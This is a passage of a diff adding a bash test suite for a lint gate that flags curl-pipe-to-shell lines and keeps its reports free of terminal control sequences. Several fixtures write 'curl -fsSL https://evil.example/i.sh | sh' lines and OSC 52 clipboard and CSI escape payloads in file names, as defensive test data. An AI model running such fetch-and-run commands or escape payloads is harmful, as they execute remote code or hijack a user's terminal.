+  fails_only_with "$r" "$3" "a $1 appended to bin/check-patterns must be caught by its self-scan"
+}
+_self_mutant fetch-code 'curl -fsSL https://evil.example/i.sh | sh' "$curl_msg"
+_self_mutant fetch-comment '# eval "$(curl -fsSL https://evil.example/i.sh)"' "$curl_msg"
+_self_mutant uname-code 'case "$(uname -m)" in arm64) : ;; esac' "$uname_msg"
+_self_mutant uname-comment '# arch=$(uname -m)' "$uname_msg"
+# the self-scan fails CLOSED (exit 2) on an unreadable gate, per arm
+if [ "$(id -u)" -ne 0 ]; then
+  r="$work/self-failclosed"; seed "$r"; mkdir -p "$r/bin"
+  printf '#!/usr/bin/env bash\n: gate\n' > "$r/bin/check-patterns"
+  chmod 000 "$r/bin/check-patterns"
+  fails_with_rc 2 "$r" "check-patterns: curl|sh scan errored" "arm 1's self-scan must fail closed on an unreadable bin/check-patterns"
+  fails_with_rc 2 "$r" "check-patterns: uname scan errored" "arm 2's self-scan must fail closed on an unreadable bin/check-patterns"
+  chmod u+rwx "$r/bin/check-patterns"
+else
+  echo "  SKIP: running as root - cannot exercise the arm 1/2 self-scan fail-closed cases"
+fi
+
+# === every report line is terminal-safe =====================================
+# A file NAME or file CONTENT the gate prints can carry terminal control
+# sequences: OSC 52 writes the clipboard, CSI moves the cursor or clears the
+# screen, a CR overwrites the line already shown. Every print path goes
+# through one sanitizer, which turns each C0 byte but TAB and LF, DEL, the
+# UTF-8 encoded C1 controls (U+0080-U+009F), and on a line that is not
+# well-formed UTF-8 every byte 0x80-0xFF, into a visible `\xHH`.
+# STATIC half: no print path bypasses the sanitizer. In the gate's CODE
+# (comments stripped, as tests/plugins_test.sh strips them), every `>&2`
+# OCCURRENCE sits on one of the helper lines _tty_fail, _err and _err_file,
+# or on a `printf` of a fixed single-quoted string with no expansion
+# (_fatal_mark's message, which must print even when the sanitizer cannot);
+# nothing names another way out (`>&1` other than a captured `2>&1`, a
+# variable fd, /dev/stdout, /dev/stderr, /dev/tty, /dev/fd/, an `exec`
+# redirection); and every find, grep, sed, sort and git command
+# (continuation lines joined, git also through _git_clean) sends its stderr
+# somewhere (`2>`), since an error there names a path or echoes an operand.
+# Checked per LOGICAL line: one `2>` on it counts for every tool there, so
+# this is a heuristic that catches a forgotten redirect, not a proof of the
+# invariant (accepted, operator 2026-09-28).
+# The one allowance is structural, not a hand-kept list: a STDIN READER, the
+# command right after a `|` or one fed by a here-string (`<<<`), reads no
+# path and has no file of the tree to name. Stdout is the harder half to pin
+# statically (a function's stdout is also how it returns a value), so arm 1,
+# the one arm that prints on stdout, is covered by the fixtures below.
+cp_code="$(sed -E 's/(^|[[:space:];&|()])#.*$/\1/' "$cp")"
+# `|| true` inside each count: no match is a count of 0, which the check
+# below names, not an ERR from pipefail.
+cp_n2="$({ grep -o -e '>&2' <<<"$cp_code" || true; } | wc -l | tr -d ' ')"
+cp_n2_helper="$({ grep -E '^_(tty_fail|err|err_file)\(\) \{' <<<"$cp_code" || true; } | { grep -o -e '>&2' || true; } | wc -l | tr -d ' ')"
+cp_n2_fixed="$({ grep -E "^[[:space:]]*printf '[^'\$]*' >&2 [|][|] :\$" <<<"$cp_code" || true; } | wc -l | tr -d ' ')"
+[ "$cp_n2" -eq 4 ] && [ "$cp_n2_helper" -eq 3 ] && [ "$cp_n2_fixed" -eq 1 ] && ok \
+  || fail "bin/check-patterns: every '>&2' must be on one of the 3 sanitizer helper lines or the 1 fixed-string printf (found $cp_n2, $cp_n2_helper on helpers, $cp_n2_fixed fixed)"
+# `2>&1` is allowed: every one sits inside a `$(...)` capture whose text is
+# then printed through a helper.
+cp_other="$(grep -nE '(^|[^2])>&1|>&[[:space:]]*["$]|/dev/(stdout|stderr|tty|fd/)|(^|[^[:alnum:]_])exec[[:space:]]+[0-9]*[<>]' <<<"$cp_code" || true)"
+[ -z "$cp_other" ] && ok \
+  || fail "bin/check-patterns: an output path around the sanitizer: $cp_other"
+# A tool in COMMAND position: at the line start, or after `$(`, `;`, `&&`,
+# `||`, `!`, `if`, `then` or a leading `VAR=value` assignment. Quoted prose
+# ("(grep -q/-m/-l, head)") holds a tool word too, but never after one of
+# these. A `|` before the tool makes it a stdin reader.
+cp_tool_re='(^|\$\(|;|&&|[|][|]|!|[|]|(^|[[:space:]])(if|then))[[:space:]]*([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*[[:space:]]+)*(find|grep|sed|sort|git|_git_clean)([[:space:]]|$)'
+cp_stdin_re='[|][[:space:]]*([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*[[:space:]]+)*(grep|sed|sort)([[:space:]]|$)|<<<'
+cp_tool_n=0; cp_stdin_n=0; cp_tool_bad=""; cp_logical=""
+while IFS= read -r line; do
+  case "$line" in
+    *\\) cp_logical="$cp_logical${line%\\} "; continue ;;
+  esac
+  cp_logical="$cp_logical$line"
+  # `[[:space:]]*` after `|` keeps `||` from reading as a pipe: `||` is
+  # matched first in cp_tool_re, and a stdin reader is only a single `|`.
+  if grep -qE -e "$cp_tool_re" <<<"$cp_logical"; then
+    case "$cp_logical" in
+      *'2>'*) cp_tool_n=$((cp_tool_n + 1)) ;;
+      *)
+        if grep -qE -e "$cp_stdin_re" <<<"${cp_logical//||/}"; then
+          cp_stdin_n=$((cp_stdin_n + 1))
+        else
+          cp_tool_bad="$cp_tool_bad$cp_logical"$'\n'
+        fi ;;
+    esac
+  fi
+  cp_logical=""
+done <<<"$cp_code"
+[ "$cp_tool_n" -ge 20 ] && [ "$cp_stdin_n" -ge 5 ] && [ -z "$cp_tool_bad" ] && ok \
+  || fail "bin/check-patterns: every find/grep/sed/sort/git must redirect its stderr unless it reads stdin ($cp_tool_n redirected, $cp_stdin_n stdin readers), unredirected: $cp_tool_bad"
+
+esc=$'\033'; bel=$'\007'; del=$'\177'
+c1=$'\xc2\x9b'; lone=$'\x9b'; rsq=$'\xe2\x80\x99'
+osc52="${esc}]52;c;aGk=${bel}"; csi="${esc}[2J"
+osc52_x='\x1b]52;c;aGk=\x07'; csi_x='\x1b[2J'
+tty_out="$work/tty-stdout"; tty_err="$work/tty-stderr"
+# _tty_run ROOT [ENV=VAL...] - run the gate, stdout and stderr to separate files.
+_tty_run() {
+  local root="$1"; shift
+  tty_rc=0
+  env STRICT= "$@" "$cp" "$root" > "$tty_out" 2> "$tty_err" || tty_rc=$?
+}
+# _tty_clean LABEL BYTES... - no stream may hold any of BYTES raw.
+_tty_clean() {
+  local label="$1" f b; shift
+  for f in "$tty_out" "$tty_err"; do
+    for b in "$@"; do
+      if LC_ALL=C grep -qF -e "$b" "$f"; then
+        fail "$label: a raw control byte reached ${f##*/}: $(od -c < "$f" | sed -n 1,12p)"
+      fi
+    done
+  done
+  ok
+}
+# _tty_has LABEL FILE TEXT - FILE holds TEXT (fixed string, byte-exact).
+_tty_has() {
+  LC_ALL=C grep -qF -e "$3" "$2" && ok \
+    || fail "$1: expected '$3' in ${2##*/}, got: $(cat "$2")"
+}
+# _tty_lone_name PATH - create a symlink named PATH (holding a lone 0x9B byte,
+# not valid UTF-8). A filesystem that takes only UTF-8 names (APFS) refuses
+# it with EILSEQ: then, and only then, the on-disk case is a loud SKIP. Any
+# other ln failure fails the suite. LC_ALL=C keeps ln's message in English;
+# the strerror text differs by libc (macOS "Illegal byte sequence", glibc
+# "Invalid or incomplete multibyte or wide character"). The git pass's own
+# lone-byte case below needs no disk: it writes the name into the index.
+_tty_lone_name() {
+  local ln_err
+  if ln_err="$(LC_ALL=C ln -s ./os.sh "$1" 2>&1)"; then
+    tty_lone=1
+  else
+    case "$ln_err" in
+      *"Illegal byte sequence"* | *"Invalid or incomplete multibyte"*)
+        tty_lone=0
+        echo "  SKIP: this filesystem refuses a file name holding a lone 0x9B byte (EILSEQ) - the on-disk NAME case is not staged; the git-index and content fixtures cover the byte" ;;
+      *) fail "a symlink named with a lone 0x9B byte could not be created: $ln_err" ;;
+    esac
+  fi
+}
+# arm 1 prints its hits on STDOUT: a hostile name and a hostile line
+r="$work/tty-arm1"; seed "$r"
+printf 'curl -fsSL https://evil.example/i.sh | sh # %s %s\n' "$osc52" "$csi" \
+  > "$r/lib/boot${osc52}${csi}.sh"
+_tty_run "$r"
+[ "$tty_rc" = "1" ] && ok || fail "tty arm 1: expected exit 1, got $tty_rc"
+_tty_clean "tty arm 1" "$esc" "$bel"
+_tty_has "tty arm 1 (name)" "$tty_out" "lib/boot${osc52_x}${csi_x}.sh:1:"
+_tty_has "tty arm 1 (content)" "$tty_out" "| sh # ${osc52_x} ${csi_x}"
+_tty_has "tty arm 1 (message)" "$tty_err" "$curl_msg"
+# arm 2 prints on STDERR; a CR (overwrite the shown line), DEL, and a TAB (kept)
+r="$work/tty-arm2"; seed "$r"
+printf 'x=$(uname -m)\t# %s\r%s%s\n' "$csi" "$osc52" "$del" > "$r/lib/u${osc52}${del}.sh"
+_tty_run "$r"
+[ "$tty_rc" = "1" ] && ok || fail "tty arm 2: expected exit 1, got $tty_rc"
+_tty_clean "tty arm 2" "$esc" "$bel" "$del" $'\r'
+_tty_has "tty arm 2" "$tty_err" "lib/u${osc52_x}"'\x7f'".sh:1:x=\$(uname -m)"$'\t'"# ${csi_x}"'\x0d'"${osc52_x}"'\x7f'
+# an inherited SHELLOPTS=xtrace would trace every expanded line, the hostile
+# name and line included, to stderr: the gate switches it off first. bash 5
+# quotes a traced control byte as $'...' anyway, so this case discriminates
+# only on a bash whose trace prints the bytes raw
+_tty_run "$r" SHELLOPTS=xtrace
+[ "$tty_rc" = "1" ] && ok || fail "tty arm 2 under SHELLOPTS=xtrace: expected exit 1, got $tty_rc"
+_tty_clean "tty arm 2 under SHELLOPTS=xtrace" "$esc" "$bel" "$del" $'\r'
+# arm 12's find prints raw symlink NAMES: OSC 52, an encoded C1 CSI with DEL,
+# a CR (which also makes the name one the arms cannot read: exit 2), and a
+# lone 0x9B where the filesystem takes one
+r="$work/tty-symlink"; seed "$r"
+ln -s ./os.sh "$r/lib/l${osc52}"
+ln -s ./os.sh "$r/lib/m${c1}${del}x"
+ln -s ./os.sh "$r/lib/o"$'\r'"y"
+_tty_lone_name "$r/lib/n${lone}z"
+_tty_run "$r"
+[ "$tty_rc" = "2" ] && ok || fail "tty symlink: expected exit 2 (a CR in a name), got $tty_rc"
+_tty_clean "tty symlink" "$esc" "$bel" "$del" $'\r' "$c1" "$lone"
+_tty_has "tty symlink (OSC 52)" "$tty_err" "lib/l${osc52_x}"
+_tty_has "tty symlink (C1, DEL)" "$tty_err" 'lib/m\xc2\x9b\x7fx'
+_tty_has "tty symlink (CR)" "$tty_err" 'lib/o\x0dy'
+[ "$tty_lone" = 0 ] || _tty_has "tty symlink (lone 0x9B)" "$tty_err" 'lib/n\x9bz'
+# an unreadable directory named with OSC 52: every walk over it errors, and
+# the error text (find's own stderr included) names it
+if [ "$(id -u)" -ne 0 ]; then
+  r="$work/tty-unreadable"; seed "$r"; mkdir -p "$r/lib/d${osc52}"
+  chmod 000 "$r/lib/d${osc52}"
+  _tty_run "$r"
+  chmod u+rwx "$r/lib/d${osc52}"
+  [ "$tty_rc" = "2" ] && ok || fail "tty unreadable dir: expected exit 2 (a scan error), got $tty_rc"
+  _tty_clean "tty unreadable dir" "$esc" "$bel"
+  # The name must be SHOWN, escaped by someone: GNU grep and find print it
+  # raw, so the gate's sanitizer escapes it (\x1b ... \x07); the macOS BSD
+  # grep and find escape a control byte in a name themselves (\033 ... \a,
+  # measured on both macOS CI legs), so it reaches the sanitizer already
+  # safe. _tty_clean above is the security half; this is the "named" half.
+  LC_ALL=C grep -qF -e "lib/d${osc52_x}" -e 'lib/d\033]52;c;aGk=\a' "$tty_err" && ok \
+    || fail "tty unreadable dir: expected the name escaped in tty-stderr, got: $(cat "$tty_err")"
+else
+  echo "  SKIP: running as root - cannot exercise the unreadable-dir terminal-safe case"
+fi
+# the repo-wide git pass prints raw tracked NAMES outside every other surface
+if command -v git >/dev/null 2>&1; then
+  r="$work/tty-git"; _git_repo "$r"; seed "$r"; mkdir -p "$r/other"
+  ln -s ../lib/os.sh "$r/other/g${csi}"
+  ln -s ../lib/os.sh "$r/other/h${c1}${del}"
+  ln -s ../lib/os.sh "$r/other/i"$'\r'
+  git -C "$r" add -A
+  # The lone-0x9B name goes straight into the index as a symlink entry: git
+  # stores a path as bytes, so this runs where the filesystem (APFS) would
+  # refuse the name. After `add -A`, which would drop an index entry with no
+  # file on disk. The path goes in on STDIN (`--index-info`), never argv:
+  # git passes every builtin's argv through precompose_argv_prefix (git.c),
+  # which on macOS with core.precomposeunicode (git init sets it there) runs
+  # each non-ASCII argument through iconv UTF-8-MAC -> UTF-8 and keeps the
+  # original only when iconv errors (compat/precompose_utf8.c). The
+  # `--cacheinfo` form stored some other path on both macOS CI legs, silently.
+  # read_index_info has no precompose step; the -c is belt and braces. The
+  # gate itself passes git no tree path (ls-files -s -z, no pathspec), so it
+  # reads the index bytes as they are.
+  tty_blob="$(printf '../lib/os.sh' | git -C "$r" hash-object -w --stdin)"
+  printf '120000 %s\tother/j%s\000' "$tty_blob" "$lone" \
+    | git -C "$r" -c core.precomposeunicode=false update-index -z --index-info \
+    || fail "tty git pass: update-index --index-info refused the lone-0x9B path"
+  git -C "$r" commit -qm init
+  # A byte compare in bash over the NUL-separated listing (no tr or grep to
+  # doubt), and on a miss the listing itself, `od -c`-escaped.
+  git -C "$r" ls-files -z > "$work/tty-git-ls" \
+    || fail "tty git pass: git ls-files failed"
+  tty_found=0
+  while IFS= read -r -d '' p; do
+    [ "$p" = "other/j${lone}" ] && tty_found=1
+  done < "$work/tty-git-ls"
+  [ "$tty_found" = 1 ] \
+    || fail "tty git pass: the lone-0x9B name did not reach the index; ls-files -z: $(od -c < "$work/tty-git-ls" | sed -n 1,40p)"
+  _tty_run "$r"
+  [ "$tty_rc" = "2" ] && ok || fail "tty git pass: expected exit 2 (a CR in a tracked name), got $tty_rc"
+  _tty_clean "tty git pass" "$esc" "$del" $'\r' "$c1" "$lone"
+  _tty_has "tty git pass (CSI)" "$tty_err" "other/g${csi_x}"
+  _tty_has "tty git pass (C1, DEL)" "$tty_err" 'other/h\xc2\x9b\x7f'
+  _tty_has "tty git pass (CR)" "$tty_err" 'other/i\x0d'
+  _tty_has "tty git pass (lone 0x9B)" "$tty_err" 'other/j\x9b'
+  # a NUL and a lone 0x9B in a tool's own stderr (_err_file): a git wrapper
+  # fails ls-files with them. The NUL is deleted, the byte escaped.
+  tty_shim="$work/tty-git-shim"; mkdir -p "$tty_shim"
+  {
+    printf '#!/bin/sh\n'
+    printf 'case " $* " in *" ls-files "*) printf '"'"'a\\000\\233b\\n'"'"' >&2; exit 1 ;; esac\n'
+    printf 'exec "%s" "$@"\n' "$(command -v git)"
+  } > "$tty_shim/git"
+  chmod u+x "$tty_shim/git"
+  r="$work/tty-git-stderr"; _git_repo "$r"; seed "$r"
+  git -C "$r" add -A && git -C "$r" commit -qm init
+  _tty_run "$r" PATH="$tty_shim:$PATH"
+  [ "$tty_rc" = "2" ] && ok || fail "tty git stderr: expected exit 2 (a failed ls-files), got $tty_rc"
+  _tty_clean "tty git stderr" "$lone"
+  [ "$(tr -cd '\000' < "$tty_err" | wc -c | tr -d ' ')" = "0" ] && ok \
+    || fail "tty git stderr: a raw NUL reached stderr"
+  _tty_has "tty git stderr" "$tty_err" 'a\x9bb'
+else
+  echo "  SKIP: git not on PATH - cannot exercise the git pass's terminal-safe report"
+fi
+# C1 in content. A well-formed UTF-8 line keeps its characters raw (U+2019,
+# E2 80 99, whose continuation bytes lie in 80-9F; a 4-byte U+1F600) and
+# escapes only the encoded C1 control (C2 9B). A line that is NOT well-formed
+# - lone 9B bytes after ASCII, an invalid lead (E0 9B, FF 9B), an overlong
+# form (E0 82 9B, C0 9B) - prints every byte 80-FF escaped, the valid U+2019
+# on it included. No LC_ALL here: the arms read with `-a`, so no locale's
+# idea of "binary" may skip the file.
+r="$work/tty-c1"; seed "$r"
+emoji=$'\xf0\x9f\x98\x80'
+fetch='curl -fsSL https://evil.example/i.sh | sh'
+{
+  printf '%s # ok a%sb c%sd %s\n' "$fetch" "$c1" "$rsq" "$emoji"
+  printf '%s # lone %s%s31m %s\n' "$fetch" "$lone" "$lone" "$rsq"
+  printf '%s # e0 \340\233|\n' "$fetch"
+  printf '%s # ff \377\233|\n' "$fetch"
+  printf '%s # ov3 \340\202\233|\n' "$fetch"
+  printf '%s # ov2 \300\233|\n' "$fetch"
+} > "$r/lib/c1.sh"
+# _tty_c1_check LABEL [ENV=VAL...] - run the gate on tty-c1 and check it all;
+# rerun below under a UTF-8 locale.
+_tty_c1_check() {
+  local label="$1"; shift
+  _tty_run "$work/tty-c1" "$@"
+  [ "$tty_rc" = "1" ] && ok || fail "$label: expected exit 1, got $tty_rc"
+  _tty_clean "$label" "$c1" "$lone"
+  _tty_has "$label (well-formed)" "$tty_out" "# ok a\\xc2\\x9bb c${rsq}d ${emoji}"
+  _tty_has "$label (lone run)" "$tty_out" '# lone \x9b\x9b31m \xe2\x80\x99'
+  _tty_has "$label (invalid lead E0)" "$tty_out" '# e0 \xe0\x9b|'
+  _tty_has "$label (invalid lead FF)" "$tty_out" '# ff \xff\x9b|'
+  _tty_has "$label (overlong, 3 bytes)" "$tty_out" '# ov3 \xe0\x82\x9b|'
+  _tty_has "$label (overlong, 2 bytes)" "$tty_out" '# ov2 \xc0\x9b|'
+}
+_tty_c1_check "tty C1"
+# LINEAR cost: a 32 KB run of lone 0x9B bytes on one line. An earlier
+# re-run loop took 39 s on it (measured); the bound leaves a slow runner
+# ample room while any quadratic pass blows through it.
+# shellcheck source=tests/lib/bounded_run.sh
+. "$repo_root/tests/lib/bounded_run.sh"
+r="$work/tty-long"; seed "$r"
+{ printf '%s # ' "$fetch"; dd if=/dev/zero bs=1024 count=32 2>/dev/null | tr '\000' '\233'; printf '\n'; } \
+  > "$r/lib/long.sh"
+# _tty_long_check LABEL [ENV=VAL...] - the bounded run; rerun below under a
+# UTF-8 locale.
+_tty_long_check() {
+  local label="$1"; shift
+  bounded_run 20 "$work/tty-long.out" env STRICT= "$@" "$cp" "$work/tty-long" \
+    || fail "$label: bounded_run could not turn job control on"
+  [ "$br_stuck" = 0 ] && [ "$br_hung" = 0 ] && ok \
+    || fail "$label: the gate outlived 20 s on a 32 KB line (hung $br_hung, stuck $br_stuck)"
+  [ "$br_rc" = "1" ] && ok || fail "$label: expected exit 1, got $br_rc"
+  LC_ALL=C grep -qF -e "$lone" "$work/tty-long.out" \
+    && fail "$label: a raw 0x9B reached the output"
+  tty_n="$(LC_ALL=C grep -o -e '\\x9b' "$work/tty-long.out" | wc -l | tr -d ' ')"
+  [ "$tty_n" = "32768" ] && ok || fail "$label: expected 32768 escaped bytes, got $tty_n"
+}
+_tty_long_check "tty long line"
+# the sanitizer FAILS CLOSED: a `sed` that fails only for the sanitizer (its
+# one `}` argument), and only on its FIRST call (a state file), via _err (arm
+# 2 prints first) and via _out (arm 1 prints first): exit 2 and the fixed
+# message, never a report silently dropped. First call only, so a helper
+# that swallowed the failure is caught: every later print succeeds, and the
+# gate would then exit 1 with a report missing its first lines.
+tty_sed_shim="$work/tty-sed-shim"; mkdir -p "$tty_sed_shim"
+tty_sed_state="$work/tty-sed-state"
+{
+  printf '#!/bin/sh\n'
+  printf 'for a in "$@"; do\n'
+  printf '  if [ "$a" = "}" ] && [ ! -e "$TTY_SED_STATE" ]; then : > "$TTY_SED_STATE"; exit 1; fi\n'
+  printf 'done\n'
+  printf 'exec "%s" "$@"\n' "$(command -v sed)"
+} > "$tty_sed_shim/sed"
+chmod u+x "$tty_sed_shim/sed"
+# A FRESH shell: the shim must be the sed a new process resolves.
+[ "$(PATH="$tty_sed_shim:$PATH" bash -c 'command -v sed')" = "$tty_sed_shim/sed" ] \
+  || fail "the sed shim is not the sed a fresh process resolves"
+tty_fail_msg="check-patterns: the report sanitizer (tr | sed) failed - failing closed"
+r="$work/tty-sedfail-err"; seed "$r"
+printf 'x=$(uname -m)\n' > "$r/lib/u.sh"
+rm -f "$tty_sed_state"
+_tty_run "$r" PATH="$tty_sed_shim:$PATH" TTY_SED_STATE="$tty_sed_state"
+[ "$tty_rc" = "2" ] && ok || fail "a failing sanitizer (via _err) must exit 2, got $tty_rc"
+[ "$(cat "$tty_err")" = "$tty_fail_msg" ] && ok \
+  || fail "a failing sanitizer (via _err): expected exactly '$tty_fail_msg', got: $(cat "$tty_err")"
+r="$work/tty-sedfail-out"; seed "$r"
+printf '%s\n' "$fetch" > "$r/lib/boot.sh"
+rm -f "$tty_sed_state"
+_tty_run "$r" PATH="$tty_sed_shim:$PATH" TTY_SED_STATE="$tty_sed_state"
+[ "$tty_rc" = "2" ] && ok || fail "a failing sanitizer (via _out) must exit 2, got $tty_rc"
+[ "$(cat "$tty_err")" = "$tty_fail_msg" ] && ok \
+  || fail "a failing sanitizer (via _out): expected exactly '$tty_fail_msg', got: $(cat "$tty_err")"
+# and with stderr UNWRITABLE (opened read-only, which every write refuses on
+# GNU and BSD alike; a CLOSED fd 2 is no test, since the next file the gate
+# opens takes that number), where even the fixed message cannot be written:
+# still exit 2, never the 1 a failed printf under `set -e` would give
+tty_rc=0; rm -f "$tty_sed_state"
+PATH="$tty_sed_shim:$PATH" TTY_SED_STATE="$tty_sed_state" STRICT= "$cp" "$work/tty-sedfail-err" \
+  >/dev/null 2</dev/null || tty_rc=$?
+[ "$tty_rc" = "2" ] && ok || fail "a failing sanitizer with stderr unwritable must exit 2, got $tty_rc"
+
+# === the caller's locale does not reach the arms ============================
+# In a UTF-8 locale GNU grep's `[^|]*` does not match an invalid byte, so arm
+# 1 passed a fetch whose URL held 0xFF (measured: exit 0 under
+# LC_ALL=C.UTF-8, 1 under LC_ALL=C). The gate exports LC_ALL=C; each case
+# here runs it under a real UTF-8 locale from `locale -a`, confirmed live
+# (bash counts a 2-byte character as one), and reruns the sanitizer cases
+# above under it. No such locale is a loud SKIP.
+tty_u8=""
+for loc in $(locale -a 2>/dev/null || true); do
+  case "$loc" in
+    [Cc].[Uu][Tt][Ff]-8 | [Cc].[Uu][Tt][Ff]8 | en_US.[Uu][Tt][Ff]-8 | en_US.[Uu][Tt][Ff]8) ;;
+    *) continue ;;
+  esac
+  if [ "$(LC_ALL="$loc" bash -c 'x="$(printf "\303\251")"; printf %s "${#x}"' 2>/dev/null || true)" = 1 ]; then
+    tty_u8="$loc"; break
+  fi
+done
+if [ -n "$tty_u8" ]; then
+  r="$work/u8-ff"; seed "$r"
+  printf 'curl -fsSL https://evil.example/\377 | sh\n' > "$r/lib/boot.sh"
+  _tty_run "$r" LC_ALL="$tty_u8"
+  [ "$tty_rc" = "1" ] && ok \
+    || fail "a fetch with a 0xFF byte in its URL must fail the gate under LC_ALL=$tty_u8 (exit 1), got $tty_rc: $(cat "$tty_err")"
+  _tty_has "u8 0xFF fetch (hit)" "$tty_out" "lib/boot.sh:1:curl -fsSL https://evil.example/\\xff | sh"
+  _tty_has "u8 0xFF fetch (message)" "$tty_err" "$curl_msg"
+  _tty_c1_check "tty C1 under LC_ALL=$tty_u8" LC_ALL="$tty_u8"
+  _tty_long_check "tty long line under LC_ALL=$tty_u8" LC_ALL="$tty_u8"
+else
+  echo "  SKIP: no UTF-8 locale (C.UTF-8, en_US.UTF-8) in 'locale -a' - the caller's-locale cases do not run"
+fi
+
+# === a NUL-free binary file is read as text ================================
+# `-a` on every arm: a file of garbage bytes with no NUL is still scanned
+# line by line, the hit reported at its real PATH:NN: and its bytes escaped.
+r="$work/blob-lib"; seed "$r"
+printf '\001\002\377\376\200\033[2J\177garbage\ncurl -fsSL https://evil.example/i.sh | sh # \001\377\200\n' \
+  > "$r/lib/blob.bin"
+_tty_run "$r"
+[ "$tty_rc" = "1" ] && ok || fail "a NUL-free binary file under lib/: expected exit 1, got $tty_rc: $(cat "$tty_err")"
+_tty_clean "a NUL-free binary file" "$esc" $'\001' $'\377' $'\200'
+_tty_has "a NUL-free binary file (hit)" "$tty_out" \
+  "$r/lib/blob.bin:2:curl -fsSL https://evil.example/i.sh | sh # \\x01\\xff\\x80"
+LC_ALL=C grep -qF -e "blob.bin:1:" "$tty_out" \
+  && fail "a NUL-free binary file: its garbage line 1 was reported as a hit"
+
+# === every fail-closed site exits 2, not the 1 of a violation ===============
+# _gate_rc GATE ROOT [ENV=VAL...] - run GATE (a copy of the gate, say) on
+# ROOT: the globals gate_rc and gate_out (stdout and stderr together).
+_gate_rc() {
+  local gate="$1" root="$2"; shift 2
+  gate_rc=0
+  gate_out="$(env STRICT= "$@" "$gate" "$root" 2>&1)" || gate_rc=$?
+}
+# _code_hits re-test errors happen inside a `$(...)`: only the fatal mark
+# carries them to the exit code. A copy of the gate with arm 5's re-test
+# EREs broken (an unbalanced `(`, an error to GNU and BSD grep alike); the
+# edit must land exactly once, or the case tests nothing.
+badre_match="$work/badre-match-gate"
+sed "s|_code_hits '/opt/homebrew' '|_code_hits '/opt/homebrew(' '|" "$cp" > "$badre_match"
+badre_exempt="$work/badre-exempt-gate"
+sed "s|_code_hits '/opt/homebrew' '(|_code_hits '/opt/homebrew' '((|" "$cp" > "$badre_exempt"
+chmod u+x "$badre_match" "$badre_exempt"
+[ "$(grep -c -F -e "_code_hits '/opt/homebrew(' '" "$badre_match")" = 1 ] \
+  || fail "the broken-match gate copy: the sed edit did not land exactly once"
+[ "$(grep -c -F -e "_code_hits '/opt/homebrew' '((" "$badre_exempt")" = 1 ] \
+  || fail "the broken-exempt gate copy: the sed edit did not land exactly once"
+r="$work/badre-lone"; seed "$r"
+printf 'P=/opt/homebrew\n' > "$r/lib/p.sh"
+_gate_rc "$badre_match" "$r"
+[ "$gate_rc" = "2" ] && ok || fail "a code re-test error must exit 2, got $gate_rc: $gate_out"
+case "$gate_out" in
+  *"check-patterns: code re-test errored"*"$r/lib/p.sh:1:"* | *"$r/lib/p.sh:1:"*"check-patterns: code re-test errored"*) ok ;;
+  *) fail "a code re-test error must report itself AND the hit: $gate_out" ;;
+esac
+r="$work/badre-pair"; seed "$r"
+printf 'for p in /opt/homebrew /usr/local; do :; done\n' > "$r/lib/p.sh"
+[ "$(run "$r")" = "0" ] || fail "the adjacent /opt/homebrew /usr/local pair must pass the real gate"
+_gate_rc "$badre_exempt" "$r"
+[ "$gate_rc" = "2" ] && ok || fail "an exemption re-test error must exit 2, got $gate_rc: $gate_out"
+case "$gate_out" in
+  *"check-patterns: exemption re-test errored"*) ok ;;
+  *) fail "an exemption re-test error must report itself: $gate_out" ;;
+esac
+# the fatal mark itself cannot be written while the sanitizer fails inside
+# arm 5's `$(... || true)` (the first-call sed shim above): nothing but the
+# signal to the main shell is left to carry the error, and the exit is 2.
+# A mktemp shim plants `fatal` in the gate's scratch dir as a DANGLING
+# symlink: the write fails (its target's dir does not exist, root included),
+# and `-e` reads it as absent, so it cannot stand in for the mark (a
+# directory there would: `-e` is true for one, and that mutant survived).
+# The pinned-plugin file is planted so arm 4 prints no SKIP first.
+mark_shim="$work/mktemp-mark-shim"; mkdir -p "$mark_shim"
+{
+  printf '#!/bin/sh\n'
+  printf 'case "$*" in *check-patterns.XXXXXX*) d="$("%s" "$@")" || exit $?; ln -s "$d/no-such-dir/mark" "$d/fatal" || exit 1; printf "%%s\\n" "$d"; exit 0 ;; esac\n' "$(command -v mktemp)"
+  printf 'exec "%s" "$@"\n' "$(command -v mktemp)"
+} > "$mark_shim/mktemp"
+chmod u+x "$mark_shim/mktemp"
+r="$work/mark-unwritable"; seed "$r"; mkdir -p "$r/zsh/plugins/fast-syntax-highlighting"
+printf '%s\n' '$(uname -a)' > "$r/zsh/plugins/fast-syntax-highlighting/fast-syntax-highlighting.plugin.zsh"
+printf 'P=/opt/homebrew\n' > "$r/lib/p.sh"
+_gate_rc "$badre_match" "$r"
+[ "$gate_rc" = "2" ] || fail "the mark fixture's premise: the broken-match copy must exit 2 alone, got $gate_rc: $gate_out"
+rm -f "$tty_sed_state"
+_gate_rc "$badre_match" "$r" PATH="$tty_sed_shim:$mark_shim:$PATH" TTY_SED_STATE="$tty_sed_state"
+[ "$gate_rc" = "2" ] && ok \
+  || fail "a failed sanitizer AND an unwritable fatal mark inside a \$(...) must still exit 2, got $gate_rc: $gate_out"
+case "$gate_out" in
+  *"check-patterns: could not write the fail-closed mark - failing closed"*) ok ;;
+  *) fail "an unwritable fatal mark must say so: $gate_out" ;;
+esac
+# the repo-wide git pass: each of its exit-2 sites not already pinned to 2
+# above (lev, probe, toplevel, ls-files error, stderr, malformed record)
+if command -v git >/dev/null 2>&1; then
+  r="$work/gm-bad"; _git_repo "$r"; seed "$r"
+  git -C "$r" add -A && git -C "$r" commit -qm init
+  printf '[submodule "x"\n\tpath = zsh/plugins/x\n' > "$r/.gitmodules"
+  fails_with_rc 2 "$r" "check-patterns: symlink scan (git, repo-wide) could not read .gitmodules" \
+    "a .gitmodules git cannot parse must fail closed" only
+  sym_tmp_shim="$work/mktemp-sym-shim"; mkdir -p "$sym_tmp_shim"
+  {
+    printf '#!/bin/sh\n'
+    printf 'case "$*" in *check-patterns-sym.*) echo "mktemp: simulated failure" >&2; exit 1 ;; esac\n'
+    printf 'exec "%s" "$@"\n' "$(command -v mktemp)"
+  } > "$sym_tmp_shim/mktemp"
+  chmod u+x "$sym_tmp_shim/mktemp"
+  r="$work/sym-tmp-fail"; _git_repo "$r"; seed "$r"
+  git -C "$r" add -A && git -C "$r" commit -qm init
+  PATH="$sym_tmp_shim:$PATH" fails_with_rc 2 "$r" \
+    "check-patterns: could not create a scratch dir for the repo-wide symlink scan" \
+    "the git pass's scratch dir failing must fail closed" only
+  # a refused NAME tracked but gone from disk: only the git pass sees it
